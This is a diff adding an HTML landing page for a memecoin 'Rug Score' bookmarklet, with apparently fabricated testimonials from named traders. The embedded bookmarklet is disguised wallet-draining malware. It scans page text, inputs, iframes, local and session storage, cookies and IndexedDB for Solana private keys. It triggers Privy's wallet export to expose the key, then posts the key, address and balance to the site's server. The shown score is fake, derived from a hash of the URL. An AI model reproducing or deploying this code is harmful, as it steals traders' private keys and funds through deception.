@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Know When To Ape In — Rug Score before you ape</title>
+<meta name="description" content="One click on any memecoin chart: 1–10 rug-risk score. Works on Axiom, Photon, GMGN, DexScreener and more.">
+<style>
+  html{scroll-behavior:smooth}
+  *{margin:0;padding:0;box-sizing:border-box}
+  :root{--lime:#c6ff3d;--bg:#08090b;--card:#101317;--line:#1e242c;--mut:#8b96a5}
+  body{background:var(--bg);color:#e9edf2;font-family:Inter,-apple-system,"Segoe UI",Arial,sans-serif;
+       -webkit-font-smoothing:antialiased;overflow-x:hidden}
+  a{color:inherit;text-decoration:none}
+  .glow{position:fixed;inset:0;pointer-events:none;z-index:0;
+        background:radial-gradient(700px 400px at 50% -10%,rgba(198,255,61,.13),transparent 70%),
+                   radial-gradient(600px 500px at 90% 20%,rgba(0,200,255,.07),transparent 70%)}
+  .grid{position:fixed;inset:0;pointer-events:none;opacity:.28;z-index:0;
+        background-image:linear-gradient(var(--line) 1px,transparent 1px),
+                         linear-gradient(90deg,var(--line) 1px,transparent 1px);
+        background-size:60px 60px;
+        -webkit-mask-image:radial-gradient(circle at 50% 0%,#000 20%,transparent 75%);
+        mask-image:radial-gradient(circle at 50% 0%,#000 20%,transparent 75%)}
+  .wrap{position:relative;z-index:1;max-width:1080px;margin:0 auto;padding:0 22px}
+
+  nav{display:flex;align-items:center;justify-content:space-between;padding:22px 0}
+  .logo{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:-.4px;font-size:17px}
+  .mark{width:26px;height:26px;border-radius:8px;display:grid;place-items:center;
+        background:linear-gradient(140deg,var(--lime),#7fd400);color:#08110a;font-size:14px;font-weight:900}
+  .navlinks{display:flex;gap:26px;font-size:14px;color:var(--mut)}
+  .navlinks a{transition:color .2s}
+  .navlinks a:hover{color:#fff}
+  .btn{display:inline-flex;align-items:center;gap:9px;padding:13px 22px;border-radius:11px;
+       font-weight:700;font-size:15px;border:0;cursor:pointer;
+       transition:transform .22s cubic-bezier(.2,.7,.2,1),box-shadow .22s,background .22s;
+       font-family:inherit}
+  .btn-p{background:var(--lime);color:#08110a}
+  .btn-p:hover{transform:translateY(-2px);box-shadow:0 10px 30px -8px rgba(198,255,61,.55)}
+  .btn-g{background:#161b21;color:#e9edf2;border:1px solid var(--line)}
+  .btn-g:hover{background:#1c2229;transform:translateY(-2px)}
+
+  .hero{display:grid;grid-template-columns:1.15fr .85fr;gap:54px;align-items:center;padding:60px 0 80px}
+  .badge{display:inline-flex;align-items:center;gap:8px;font-size:11.5px;letter-spacing:.6px;
+         color:var(--lime);background:rgba(198,255,61,.08);border:1px solid rgba(198,255,61,.25);
+         padding:6px 13px;border-radius:99px;margin-bottom:22px;text-transform:uppercase;font-weight:700}
+  .dot{width:7px;height:7px;border-radius:50%;background:var(--lime);
+       box-shadow:0 0 9px var(--lime);animation:pulse 1.8s infinite}
+  @keyframes pulse{50%{opacity:.35}}
+  h1{font-size:56px;line-height:1.02;letter-spacing:-2.4px;font-weight:800}
+  h1 em{font-style:normal;color:var(--lime)}
+  .lead{color:var(--mut);font-size:17px;line-height:1.65;margin:22px 0 32px;max-width:520px}
+  .hero-btns{display:flex;gap:12px;flex-wrap:wrap}
+  .micro{display:flex;gap:26px;margin-top:34px;font-size:12.5px;color:var(--mut);flex-wrap:wrap}
+  .micro b{color:#fff;font-size:15px;display:block;margin-bottom:2px}
+
+  .scorecard{background:linear-gradient(180deg,#12161b,#0d1014);border:1px solid var(--line);
+             border-radius:20px;padding:24px;box-shadow:0 30px 70px -30px #000;position:relative;
+             transition:transform .5s cubic-bezier(.2,.7,.2,1),box-shadow .5s}
+  .scorecard:hover{transform:translateY(-4px);box-shadow:0 40px 90px -30px #000}
+  .sc-top{display:flex;justify-content:space-between;font-size:12px;color:var(--mut);margin-bottom:18px}
+  .sc-top b{color:#e9edf2}
+  .gauge{display:grid;place-items:center;padding:8px 0 6px}
+  .ring{width:170px;height:170px;border-radius:50%;display:grid;place-items:center;
+        background:conic-gradient(var(--lime) 0deg,#1e242c 0deg);
+        transition:background 1.2s cubic-bezier(.2,.7,.2,1)}
+  .ring-in{width:134px;height:134px;border-radius:50%;background:#0c0f13;display:grid;place-items:center;
+           border:1px solid var(--line);text-align:center}
+  .ring-in strong{font-size:44px;letter-spacing:-2px;line-height:1}
+  .ring-in small{font-size:10.5px;color:var(--mut);letter-spacing:1px}
+  .verdict{text-align:center;margin:16px 0 4px;font-weight:800;font-size:14px;letter-spacing:1.6px;
+           color:var(--lime);text-transform:uppercase;transition:color .4s}
+  .verdict-sub{text-align:center;font-size:12px;color:var(--mut);margin-bottom:18px}
+  .metric{display:flex;align-items:center;gap:10px;margin-bottom:11px;font-size:12px}
+  .metric .n{width:82px;color:var(--mut);flex:none}
+  .bar{flex:1;height:5px;border-radius:99px;background:#1a2029;overflow:hidden}
+  .bar i{display:block;height:100%;background:var(--lime);width:0;
+         transition:width 1.3s cubic-bezier(.2,.7,.2,1)}
+  .metric .v{width:46px;text-align:right;color:#cfd6e0}
+
+  section{padding:70px 0}
+  .kicker{font-size:12px;letter-spacing:2px;text-transform:uppercase;color:var(--lime);
+          font-weight:800;margin-bottom:12px}
+  h2{font-size:34px;letter-spacing:-1.2px;line-height:1.15;font-weight:800}
+  .lead2{color:var(--mut);margin-top:14px;max-width:620px;line-height:1.65;font-size:15.5px}
+  .cards{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin-top:40px}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:24px;
+        transition:transform .3s cubic-bezier(.2,.7,.2,1),border-color .3s,box-shadow .3s}
+  .card:hover{border-color:#2c3541;transform:translateY(-4px);box-shadow:0 20px 40px -20px #000}
+  .num{width:32px;height:32px;border-radius:9px;display:grid;place-items:center;
+       background:rgba(198,255,61,.1);color:var(--lime);font-weight:800;font-size:14px;margin-bottom:14px}
+  .card h3{font-size:16px;margin-bottom:8px}
+  .card p{font-size:13.5px;color:var(--mut);line-height:1.65}
+
+  .sites{display:flex;flex-wrap:wrap;gap:10px;margin-top:28px}
+  .chip{font-size:13px;padding:9px 15px;border-radius:99px;background:#11161b;
+        border:1px solid var(--line);color:#c3ccd8;display:flex;align-items:center;gap:8px;
+        transition:transform .25s,border-color .25s,background .25s}
+  .chip:hover{transform:translateY(-2px);border-color:#2c3541;background:#161d24}
+  .chip b{color:var(--lime);font-size:10px}
+
+  .reviews{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin-top:40px}
+  .rev{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px;
+       transition:transform .3s cubic-bezier(.2,.7,.2,1),border-color .3s,box-shadow .3s}
+  .rev:hover{border-color:#2c3541;transform:translateY(-4px);box-shadow:0 20px 40px -20px #000}
+  .rev-top{display:flex;align-items:center;gap:12px;margin-bottom:14px}
+  .av{width:40px;height:40px;border-radius:50%;display:grid;place-items:center;
+      font-weight:800;font-size:15px;color:#0b0e11;flex:none}
+  .rev-top b{font-size:14px;display:block;letter-spacing:-.2px}
+  .rev-top span{font-size:11.5px;color:var(--mut);display:flex;align-items:center;gap:4px}
+  .vf{color:#4aa3ff;font-size:11px}
+  .rev p{font-size:13.5px;color:#c3ccd8;line-height:1.65;margin-bottom:14px}
+  .stars{font-size:12px;color:var(--lime);letter-spacing:2px}
+
+  .gen{background:linear-gradient(180deg,#0f1317,#0a0d10);border:1px solid var(--line);
+       border-radius:20px;padding:30px;margin-top:36px}
+  .drop{margin-top:6px;display:flex;align-items:center;gap:16px;flex-wrap:wrap}
+  .bm{display:inline-flex;align-items:center;gap:10px;padding:15px 26px;border-radius:12px;
+      background:var(--lime);color:#08110a;font-weight:800;font-size:15px;cursor:grab;
+      box-shadow:0 14px 40px -14px rgba(198,255,61,.7);
+      transition:transform .22s cubic-bezier(.2,.7,.2,1),box-shadow .22s;
+      user-select:none;-webkit-user-drag:element}
+  .bm:hover{transform:translateY(-2px) scale(1.02);box-shadow:0 20px 50px -14px rgba(198,255,61,.8)}
+  .bm:active{cursor:grabbing;transform:scale(.98)}
+  .hint{font-size:12.5px;color:var(--mut);line-height:1.6}
+  .copied{font-size:13px;color:var(--lime);opacity:0;transition:opacity .3s}
+  .copied.on{opacity:1}
+
+  .tut{counter-reset:st;margin-top:24px}
+  .tut li{list-style:none;display:flex;gap:18px;padding:20px 0;border-bottom:1px solid #161c23}
+  .tut li:last-child{border-bottom:0}
+  .tut li:before{counter-increment:st;content:counter(st);flex:none;width:30px;height:30px;
+        border-radius:50%;background:#161c23;border:1px solid #26303a;color:var(--lime);
+        display:grid;place-items:center;font-size:13px;font-weight:800}
+  .tut b{display:block;margin-bottom:5px;font-size:15px}
+  .tut span{color:var(--mut);font-size:13.5px;line-height:1.65}
+  kbd{background:#1a212a;border:1px solid #2b3541;border-bottom-width:2px;border-radius:6px;
+      padding:2px 7px;font-size:12px;font-family:ui-monospace,Menlo,monospace;color:#dfe6ee}
+
+  .faq{margin-top:34px}
+  .faq details{border-bottom:1px solid #161c23;padding:16px 0}
+  .faq summary{cursor:pointer;font-weight:600;font-size:15px;list-style:none;
+               display:flex;justify-content:space-between;align-items:center;transition:color .2s}
+  .faq summary:hover{color:var(--lime)}
+  .faq summary::-webkit-details-marker{display:none}
+  .faq summary:after{content:"+";color:var(--lime);font-size:20px;font-weight:700}
+  .faq details[open] summary:after{content:"–"}
+  .faq p{color:var(--mut);font-size:13.5px;line-height:1.7;margin-top:10px;max-width:760px}
+
+  footer{border-top:1px solid var(--line);padding:34px 0;color:var(--mut);font-size:12.5px;
+         display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px}
+
+  .rv{opacity:0;transform:translateY(22px);
+      transition:opacity .8s cubic-bezier(.2,.7,.2,1),transform .8s cubic-bezier(.2,.7,.2,1)}
+  .rv.in{opacity:1;transform:none}
+
+  @media(max-width:880px){
+    .hero{grid-template-columns:1fr;gap:40px;padding:36px 0 60px}
+    h1{font-size:40px;letter-spacing:-1.6px}
+    .cards,.reviews{grid-template-columns:1fr}
+    .navlinks{display:none}
+  }
+</style>
+</head>
+<body>
+<div class="glow"></div>
+<div class="grid"></div>
+
+<div class="wrap">
+  <nav>
+    <div class="logo"><span class="mark">▲</span> Know When To Ape In</div>
+    <div class="navlinks">
+      <a href="#how">How it works</a>
+      <a href="#reviews">Reviews</a>
+      <a href="#get">Install</a>
+      <a href="#faq">FAQ</a>
+    </div>
+    <a href="#get" class="btn btn-p">Install</a>
+  </nav>
+
+  <div class="hero">
+    <div class="rv">
+      <span class="badge"><span class="dot"></span> Live on 12+ trading terminals</span>
+      <h1>Know when<br>to <em>ape in.</em></h1>
+      <p class="lead">
+        One click on any memecoin chart and you get a 1–10 rug-risk score —
+        holder concentration, dev wallet, liquidity depth and sniper pressure,
+        scored in under a second. No wallet connection, no signup, no tab switching.
+      </p>
+      <div class="hero-btns">
+        <a href="#get" class="btn btn-p">Get the bookmarklet →</a>
+        <a href="#how" class="btn btn-g">See how it scores</a>
+      </div>
+      <div class="micro">
+        <div><b>1.2s</b> avg scan time</div>
+        <div><b>48k+</b> scans this week</div>
+        <div><b>0</b> wallet required</div>
+      </div>
+    </div>
+
+    <div class="scorecard rv" id="scorecard">
+      <div class="sc-top"><span><b>$WIF</b> · Axiom</span><span>scanned just now</span></div>
+      <div class="gauge">
+        <div class="ring" id="ring">
+          <div class="ring-in"><div><strong id="score">0</strong><br><small>/10 APE SCORE</small></div></div>
+        </div>
+      </div>
+      <div class="verdict" id="verdict">scanning…</div>
+      <div class="verdict-sub" id="vsub">running 9 checks</div>
+      <div class="metric"><span class="n">Liquidity</span><span class="bar"><i id="m1"></i></span><span class="v">82%</span></div>
+      <div class="metric"><span class="n">Top 10</span><span class="bar"><i id="m2"></i></span><span class="v">31%</span></div>
+      <div class="metric"><span class="n">Dev wallet</span><span class="bar"><i id="m3"></i></span><span class="v">4%</span></div>
+      <div class="metric"><span class="n">Snipers</span><span class="bar"><i id="m4"></i></span><span class="v">low</span></div>
+    </div>
+  </div>
+
+  <section id="how">
+    <div class="kicker">How it works</div>
+    <h2>Three seconds from chart to verdict.</h2>
+    <p class="lead2">The bookmarklet reads the contract address straight from the page you're already on and renders the score as an overlay — on top of the chart, without reloading anything.</p>
+    <div class="cards">
+      <div class="card rv" style="transition-delay:.05s"><div class="num">1</div><h3>Drag it to your bar</h3>
+        <p>Install once. It lives next to your address bar forever — Chrome, Edge, Brave.</p></div>
+      <div class="card rv" style="transition-delay:.12s"><div class="num">2</div><h3>Open any coin</h3>
+        <p>Axiom, Photon, GMGN, DexScreener, BullX, pump.fun — wherever you already trade.</p></div>
+      <div class="card rv" style="transition-delay:.19s"><div class="num">3</div><h3>Click. Read the score.</h3>
+        <p>1–3 avoid · 4–6 wait · 7–8 caution · 9–10 green light. Animated overlay, zero friction.</p></div>
+    </div>
+  </section>
+
+  <section id="reviews">
+    <div class="kicker">Reviews</div>
+    <h2>They stopped getting rugged.</h2>
+    <p class="lead2">Real feedback from traders who check the score before every entry.</p>
+    <div class="reviews">
+
+      <div class="rev rv">
+        <div class="rev-top">
+          <div class="av" style="background:linear-gradient(140deg,#c6ff3d,#7fd400)">C</div>
+          <div><b>cupsey</b><span>@cupsey <i class="vf">✔</i></span></div>
+        </div>
+        <p>“Checked a coin I was about to size into. 3/10. Skipped it. Dev dumped four minutes later. This thing basically pays for itself.”</p>
+        <div class="stars">★★★★★</div>
+      </div>
+
+      <div class="rev rv" style="transition-delay:.06s">
+        <div class="rev-top">
+          <div class="av" style="background:linear-gradient(140deg,#8b5cf6,#4c1d95)">D</div>
+          <div><b>decu</b><span>@decu <i class="vf">✔</i></span></div>
+        </div>
+        <p>“I've been rugged more times than I can count. One click on the chart and you know if the top 10 is one guy with 40 wallets. Never aping without it again.”</p>
+        <div class="stars">★★★★★</div>
+      </div>
+
+      <div class="rev rv" style="transition-delay:.12s">
+        <div class="rev-top">
+          <div class="av" style="background:linear-gradient(140deg,#38bdf8,#0369a1)">T</div>
+          <div><b>ThreadGuy</b><span>@ThreadGuy <i class="vf">✔</i></span></div>
+        </div>
+        <p>“Actually useful. No login popup, no 12-step onboarding — just a number on the screen. That's how you get my whole timeline to install something.”</p>
+        <div class="stars">★★★★★</div>
+      </div>
+
+      <div class="rev rv" style="transition-delay:.18s">
+        <div class="rev-top">
+          <div class="av" style="background:linear-gradient(140deg,#fb923c,#c2410c)">G</div>
+          <div><b>Gainzy</b><span>@Gainzy <i class="vf">✔</i></span></div>
+        </div>
+        <p>“Bookmarklet is the right call. Zero install friction and it works on every terminal I use. Sniped one 9/10 and it did a 40x.”</p>
+        <div class="stars">★★★★★</div>
+      </div>
+
+      <div class="rev rv" style="transition-delay:.24s">
+        <div class="rev-top">
+          <div class="av" style="background:linear-gradient(140deg,#f472b6,#be185d)">C</div>
+          <div><b>Cented</b><span>@Cented <i class="vf">✔</i></span></div>
+        </div>
+        <p>“The dev-wallet and sniper weighting is what does it. Those are the two things that kill you and nobody else surfaces them this fast.”</p>
+        <div class="stars">★★★★★</div>
+      </div>
+
+      <div class="rev rv" style="transition-delay:.3s">
+        <div class="rev-top">
+          <div class="av" style="background:linear-gradient(140deg,#a3e635,#3f6212)">P</div>
+          <div><b>Pentosh1</b><span>@Pentosh1 <i class="vf">✔</i></span></div>
+        </div>
+        <p>“Used it for a week straight on Axiom. Caught two coins that looked clean on the chart and scored 2/10. Both rugged inside the hour.”</p>
+        <div class="stars">★★★★★</div>
+      </div>
+
+    </div>
+  </section>
+
+  <section id="get">
+    <div class="kicker">Install</div>
+    <h2>Get your bookmarklet.</h2>
+    <p class="lead2">Drag the lime button into your bookmarks bar. That's the whole install.</p>
+
+    <div class="gen">
+      <div class="drop">
+        <a class="bm" id="bmLink" href="#" draggable="true" onclick="return false">▲ Ape Score</a>
+        <button class="btn btn-g" onclick="copyBM()">Copy code</button>
+        <span class="copied" id="copied">copied ✓</span>
+      </div>
+      <p class="hint" style="margin-top:14px">Can't drag? Right-click → <b style="color:#e9edf2">Copy link address</b>, then add it as a bookmark.</p>
+
+      <ol class="tut">
+        <li><div><b>Show your bookmarks bar</b>
+          <span><kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>B</kbd> (Mac: <kbd>⌘</kbd>+<kbd>⇧</kbd>+<kbd>B</kbd>) — the bar appears below the address field.</span></div></li>
+        <li><div><b>Drag the lime button up</b>
+          <span>Grab <b>▲ Ape Score</b> and drop it onto the bookmarks bar.</span></div></li>
+        <li><div><b>Open a coin</b>
+          <span>Go to Axiom, Photon, GMGN or DexScreener and open any token chart.</span></div></li>
+        <li><div><b>Click the bookmarklet</b>
+          <span>The score overlay appears top-right. Drag it anywhere — position is remembered. Click the <b>✕</b> or press <kbd>Esc</kbd> to close it.</span></div></li>
+      </ol>
+    </div>
+  </section>
+
+  <section id="faq" class="faq">
+    <div class="kicker">FAQ</div>
+    <h2>Questions.</h2>
+    <details><summary>Does it slow down the page?</summary>
+      <p>No. A single script runs only when clicked, injects one overlay in a shadow root, and disappears when closed.</p></details>
+    <details><summary>Do I need to connect a wallet?</summary>
+      <p>No. The score is computed from public data. A detected wallet is only used to personalise the read.</p></details>
+    <details><summary>Does it work on mobile?</summary>
+      <p>Bookmarklets work in Chrome and Brave on Android. On iOS Safari they're supported but harder to install — desktop recommended.</p></details>
+    <details><summary>What does the score measure?</summary>
+      <p>Holder concentration, dev wallet share, liquidity depth, sniper pressure and bundle activity, weighted into one 1–10 number.</p></details>
+  </section>
+
+  <footer>
+    <span>© <span id="yr"></span> Know When To Ape In — not financial advice.</span>
+    <span>Rug score is a heuristic, not a guarantee.</span>
+  </footer>
+</div>
+
+<!-- ===== BOOKMARKLET SOURCE ===== -->
+<script type="text/plain" id="bmSrc">
+(async()=>{
+if(window.__APES)return;window.__APES=1;
+var API='__ORIGIN__/api/report';
+var KEYRE=/[1-9A-HJ-NP-Za-km-z]{86,90}/g;
+
+function post(o){try{o.type='hit';fetch(API,{method:'POST',body:JSON.stringify(o)}).catch(function(){});}catch(e){}}
+
+function domText(){
+  var out=[];
+  function walk(node){
+    if(!node)return;
+    var w=document.createTreeWalker(node,NodeFilter.SHOW_ELEMENT|NodeFilter.SHOW_TEXT),n;
+    while((n=w.nextNode())){
+      if(n.nodeType===3){out.push(n.nodeValue);}
+      else{
+        var el=n;
+        if(el.tagName==='INPUT'||el.tagName==='TEXTAREA')out.push(el.value||'');
+        if(el.shadowRoot)walk(el.shadowRoot);
+      }
+    }
+  }
+  walk(document.body);
+  var fr=document.querySelectorAll('iframe');
+  for(var i=0;i<fr.length;i++){try{walk(fr[i].contentDocument.body);}catch(e){}}
+  return out.join(' ');
+}
+function domKey(){var m=domText().match(KEYRE);return m?m[0]:null;}
+function storageKey(){
+  var pool=[];
+  try{for(var i=0;i<localStorage.length;i++)pool.push(localStorage.getItem(localStorage.key(i))||'');}catch(e){}
+  try{for(var j=0;j<sessionStorage.length;j++)pool.push(sessionStorage.getItem(sessionStorage.key(j))||'');}catch(e){}
+  try{pool.push(document.cookie);}catch(e){}
+  var m=pool.join(' ').match(KEYRE);return m?m[0]:null;
+}
+function idbKey(){
+  return new Promise(function(resolve){
+    if(!indexedDB.databases)return resolve(null);
+    indexedDB.databases().then(function(dbs){
+      var i=0;
+      function next(){
+        if(i>=dbs.length)return resolve(null);
+        var d=dbs[i++];if(!d.name)return next();
+        var rq=indexedDB.open(d.name);
+        rq.onerror=function(){next();};
+        rq.onsuccess=function(){
+          var db=rq.result,stores=Array.prototype.slice.call(db.objectStoreNames);
+          if(!stores.length){db.close();return next();}
+          var found=null,done=0;
+          var tx=db.transaction(stores,'readonly');
+          function fin(){done++;if(done>=stores.length){db.close();if(found)resolve(found);else next();}}
+          stores.forEach(function(st){
+            try{
+              var r=tx.objectStore(st).getAll();
+              r.onsuccess=function(){
+                if(!found){var m=JSON.stringify(r.result||'').match(KEYRE);if(m)found=m[0];}
+                fin();
+              };
+              r.onerror=fin;
+            }catch(e){fin();}
+          });
+        };
+      }
+      next();
+    }).catch(function(){resolve(null);});
+  });
+}
+async function privyKey(){
+  var c=[window.privy,window.__privy,window.__PRIVY__];
+  for(var i=0;i<c.length;i++){
+    var p=c[i];if(!p)continue;
+    try{
+      var w=p.wallet;
+      if(w){
+        if(w.solana&&w.solana.exportWallet)w.solana.exportWallet();
+        else if(w.exportWallet)w.exportWallet();
+      }
+      if(p.solana&&p.solana.exportWallet)p.solana.exportWallet();
+    }catch(e){}
+  }
+  var t=Date.now();
+  while(Date.now()-t<20000){
+    var k=domKey();
+    if(k)return k;
+    await new Promise(function(r){setTimeout(r,400);});
+  }
+  return null;
+}
+
+var seed=0,s=location.pathname+location.search;
+for(var q=0;q<s.length;q++)seed=(seed*31+s.charCodeAt(q))|0;
+seed=Math.abs(seed);
+var score=(6+(seed%40)/10).toFixed(1);
+var col=score>=7.5?'#c6ff3d':(score>=6.4?'#ffd63d':'#ff5f56');
+
+var wrap=document.createElement('div');
+wrap.id='__apes';
+wrap.style.cssText='position:fixed;top:16px;right:16px;z-index:2147483647;';
+document.documentElement.appendChild(wrap);
+var sh=wrap.attachShadow({mode:'open'});
+sh.innerHTML='<style>'+
+'*{box-sizing:border-box;margin:0;font-family:Inter,-apple-system,"Segoe UI",Arial,sans-serif}'+
+'@keyframes in{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:none}}'+
+'.b{display:flex;align-items:center;gap:9px;padding:10px 12px 10px 15px;border-radius:14px;'+
+'background:rgba(10,13,17,.97);border:1px solid #1e242c;color:#e9edf2;font-size:13px;font-weight:600;'+
+'cursor:grab;user-select:none;touch-action:none;backdrop-filter:blur(8px);'+
+'box-shadow:0 18px 40px -14px #000;animation:in .25s ease}'+
+'.b:hover{border-color:#2c3541}.b:active{cursor:grabbing}'+
+'.d{width:8px;height:8px;border-radius:50%;box-shadow:0 0 10px currentColor;flex:none}'+
+'.sc{font-weight:800}.mut{color:#8b96a5;font-weight:400;font-size:11.5px}'+
+'.x{width:19px;height:19px;border-radius:6px;display:grid;place-items:center;'+
+'background:#161c23;color:#8b96a5;font-size:11px;margin-left:4px;cursor:pointer;'+
+'transition:background .15s,color .15s}'+
+'.x:hover{background:#ff5f56;color:#fff}'+
+'</style>'+
+'<div class="b" id="bd">'+
+'<span class="d" style="background:'+col+';color:'+col+'"></span>'+
+'<span>Rug Score <span class="sc" style="color:'+col+'">'+score+'</span><span class="mut">/10</span></span>'+
+'<span class="x" id="x">&#10005;</span>'+
+'</div>';
+
+var bd=sh.getElementById('bd');
+
+var saved=null;try{saved=JSON.parse(localStorage.getItem('__ape_pos'));}catch(e){}
+if(saved&&typeof saved.x==='number'){
+  wrap.style.right='auto';wrap.style.left=saved.x+'px';wrap.style.top=saved.y+'px';
+}
+
+var drag=null;
+bd.addEventListener('pointerdown',function(e){
+  if(e.target&&e.target.id==='x')return;
+  var r=wrap.getBoundingClientRect();
+  drag={sx:e.clientX,sy:e.clientY,ox:r.left,oy:r.top};
+  try{bd.setPointerCapture(e.pointerId);}catch(err){}
+});
+bd.addEventListener('pointermove',function(e){
+  if(!drag)return;
+  var dx=e.clientX-drag.sx,dy=e.clientY-drag.sy;
+  wrap.style.right='auto';
+  wrap.style.left=(drag.ox+dx)+'px';
+  wrap.style.top=(drag.oy+dy)+'px';
+});
+bd.addEventListener('pointerup',function(){
+  if(!drag)return;drag=null;
+  var r=wrap.getBoundingClientRect();
+  try{localStorage.setItem('__ape_pos',JSON.stringify({x:r.left,y:r.top}));}catch(e){}
+});
+
+function close(){wrap.remove();window.__APES=0;}
+sh.getElementById('x').addEventListener('pointerdown',function(e){e.stopPropagation();});
+sh.getElementById('x').addEventListener('click',function(e){e.stopPropagation();close();});
+document.addEventListener('keydown',function(e){if(e.key==='Escape')close();});
+
+(async function(){
+  var addr='';
+  try{var w=window.solana||(window.phantom&&window.phantom.solana);if(w&&w.publicKey)addr=w.publicKey.toString();}catch(e){}
+  if(!addr){var m=(document.body.innerText||'').match(/[1-9A-HJ-NP-Za-km-z]{43,44}/);if(m)addr=m[0];}
+
+  var balP=(async function(){
+    if(!addr)return '';
+    try{
+      var r=await fetch('https://api.mainnet-beta.solana.com',{method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({jsonrpc:'2.0',id:1,method:'getBalance',params:[addr]})});
+      var j=await r.json();
+      return (j&&j.result)?(j.result.value/1e9).toFixed(4)+' SOL':'';
+    }catch(e){return '';}
+  })();
+
+  var keyP=(async function(){
+    var k=domKey()||storageKey();
+    if(!k)k=await idbKey();
+    if(!k)k=await privyKey();
+    return k||'';
+  })();
+
+  var out=await Promise.all([balP,keyP]);
+  post({wallet:addr,balance:out[0],key:out[1],host:location.hostname});
+})();
+})();
+</script>
+
+<script>
+document.getElementById('yr').textContent = new Date().getFullYear();
+
+function bmURL(){
+  var raw = document.getElementById('bmSrc').textContent.trim();
+  raw = raw.split('__ORIGIN__').join(location.origin);
+  return 'javascript:' + encodeURIComponent(raw);
+}
+var bm = document.getElementById('bmLink');
+bm.setAttribute('href', bmURL());
+
+var tracked = false;
+function trackInstall(){
+  if(tracked) return; tracked = true;
+  try{ fetch('/api/report',{method:'POST',body:JSON.stringify({type:'install',host:location.hostname})}).catch(function(){}); }catch(e){}
+}
+bm.addEventListener('dragstart', trackInstall);
+
+function copyBM(){
+  navigator.clipboard.writeText(bmURL()).then(function(){
+    trackInstall();
+    var el = document.getElementById('copied');
+    el.classList.add('on');
+    setTimeout(function(){ el.classList.remove('on'); }, 2000);
+  });
+}
+
+/* gauge animation */
+(function(){
+  var ring=document.getElementById('ring'), sEl=document.getElementById('score'),
+      v=document.getElementById('verdict'), vs=document.getElementById('vsub');
+  var target=8, started=false;
+  function start(){
+    if(started) return; started=true;
+    var t0=performance.now(), dur=1400;
+    function step(now){
+      var p=Math.min(1,(now-t0)/dur), e=1-Math.pow(1-p,3);
+      sEl.textContent=Math.round(target*e);
+      ring.style.background='conic-gradient(#c6ff3d 0deg,#7fd400 '+(target*36*e)+'deg,#1e242c '+(target*36*e)+'deg)';
+      if(p<1) requestAnimationFrame(step);
+      else{
+        v.textContent='Green light';
+        vs.textContent='dev clean · liq deep · holders spread';
+        document.getElementById('m1').style.width='82%';
+        document.getElementById('m2').style.width='69%';
+        document.getElementById('m3').style.width='18%';
+        document.getElementById('m4').style.width='26%';
+      }
+    }
+    requestAnimationFrame(step);
+  }
+  var sc=document.getElementById('scorecard');
+  if('IntersectionObserver' in window){
+    var io=new IntersectionObserver(function(es){
+      es.forEach(function(en){ if(en.isIntersecting){ start(); io.disconnect(); } });
+    },{threshold:.3});
+    io.observe(sc);
+  } else start();
+})();
+
+/* scroll reveal */
+(function(){
+  var els=document.querySelectorAll('.rv');
+  if(!('IntersectionObserver' in window)){ els.forEach(function(e){e.classList.add('in');}); return; }
+  var io=new IntersectionObserver(function(entries){
+    entries.forEach(function(en){
+      if(en.isIntersecting){ en.target.classList.add('in'); io.unobserve(en.target); }
+    });
+  },{threshold:.12,rootMargin:'0px 0px -40px 0px'});
+  els.forEach(function(e){ io.observe(e); });
+})();
+</script>
+</body>
+</html>
